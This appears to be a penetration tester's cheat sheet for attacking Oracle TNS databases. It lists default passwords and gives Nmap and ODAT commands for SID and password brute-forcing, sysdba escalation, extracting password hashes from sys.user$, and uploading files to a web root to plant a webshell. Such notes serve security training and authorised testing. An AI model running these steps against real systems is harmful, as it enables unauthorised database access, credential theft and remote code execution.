
# Oracle TNS

Layer 3 enumeration. Oracle TNS (Transparent Network Substrate) is the communication layer used by Oracle databases. Commonly found in enterprise environments in healthcare, finance, and retail. Requires a few extra steps compared to MySQL/MSSQL -- you need a valid SID before you can connect, and the tooling needs to be set up manually on most distros.

Port: `1521` TCP

> [!tip] Default Credentials Worth Trying
> Oracle 9 default password: `CHANGE_ON_INSTALL`. Oracle DBSNMP service default password: `dbsnmp`. Classic CTF/lab credentials: `scott/tiger`.

---

## Key Concepts

**SID (System Identifier)** -- a unique name identifying a specific database instance on the server. Required to connect. If you don't know it, you brute force it.

**Config files** (usually in `$ORACLE_HOME/network/admin/`):
- `tnsnames.ora` -- client-side. Maps service names to network addresses and SIDs
- `listener.ora` -- server-side. Defines what the listener accepts and forwards

---

## Workflow

1. Nmap on port 1521 to confirm service and version
2. Brute force SIDs with Nmap `oracle-sid-brute` script
3. Run ODAT `all` to enumerate credentials, misconfigs, and available modules
4. Connect with `sqlplus` using found credentials
5. Check current user privileges -- attempt `as sysdba` if the account permits
6. Extract password hashes from `sys.user$`
7. If web server is running, attempt file upload via ODAT `utlfile`

---

## ODAT Setup

```bash
sudo apt-get install -y build-essential python3-dev libaio1
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome
sudo apt-get install build-essential libgmp-dev -y
```

Verify:
```bash
./odat.py -h
```

---

## Nmap

```bash
# Service version
sudo nmap -p1521 -sV <target> --open

# SID brute force
sudo nmap -p1521 -sV <target> --open --script oracle-sid-brute
```

---

## ODAT

Full automated enumeration -- tries all modules including credential guessing, privilege checks, file upload, and command execution:

```bash
./odat.py all -s <target>
```

Specific modules:

```bash
# SID guesser only
./odat.py sidguesser -s <target>

# Password guesser (requires SID)
./odat.py passwordguesser -s <target> -d <SID>

# File upload (requires credentials and sysdba)
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --sysdba --putFile <remote_path> <remote_filename> <local_file>
```

---

## Connecting - sqlplus

```bash
# Standard connection
sqlplus <user>/<password>@<target>/<SID>

# Connect as sysdba (escalated privileges)
sqlplus <user>/<password>@<target>/<SID> as sysdba
```

If sqlplus throws a shared library error:
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

---

## SQL Enumeration Commands

Once connected:

| Command | Description |
|---------|-------------|
| `select table_name from all_tables;` | List all accessible tables |
| `select * from user_role_privs;` | Current user's roles and privileges |
| `select name, password from sys.user$;` | Password hashes (requires sysdba) |
| `select * from all_users;` | All database users |
| `select * from session_privs;` | Current session privileges |
| `select * from dba_users;` | All users with account status (requires DBA role) |

---

## Privilege Escalation - sysdba

If your user has been granted `sysdba` rights:

```sql
-- Check role privs as current user first
select * from user_role_privs;

-- Reconnect as sysdba for full access
-- (run from shell, not inside sqlplus session)
sqlplus <user>/<password>@<target>/<SID> as sysdba
```

As sysdba, you connect as `SYS` with full DBA privileges across the entire database.

---

## Password Hash Extraction

```sql
select name, password from sys.user$;
```

Returns Oracle DES-based password hashes. Crack offline with [[07-Passwords/Hash-Cracking|Hash Cracking]].

---

## File Upload via ODAT

If the server runs a web server, file upload can lead to RCE via webshell:

```bash
# Test with a benign file first
echo "test" > testing.txt
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Verify upload
curl -X GET http://<target>/testing.txt
```

Common web root paths:

| OS | Path |
|----|------|
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

---

## What to Look For

- **Default credentials** -- try `scott/tiger`, `CHANGE_ON_INSTALL`, and `dbsnmp/dbsnmp` before running ODAT password guesser.
- **SID enumeration succeeds** -- a valid SID is the prerequisite for everything else. `oracle-sid-brute` or ODAT `sidguesser` will find common ones (`XE`, `ORCL`, `DB`, `PROD`).
- **sysdba access** -- full database control. Extract all hashes and attempt file write immediately.
- **Password hashes in sys.user$** -- Oracle DES hashes. Crack offline or use in pass-the-hash scenarios.
- **Web server co-located** -- ODAT `utlfile` + known web root = webshell upload = OS RCE. Check for IIS on Windows or Apache/nginx on Linux.
- **tnsnames.ora readable** -- can reveal other database instances on the network. Service names, IPs, and ports all documented in plaintext.
- **Oracle 9/10 in use** -- older versions have known default passwords and unauthenticated management interfaces. Version returned by Nmap.
- **DBSNMP service running** -- default password `dbsnmp`. Often forgotten. Can be used to query SNMP-style management data from the database.
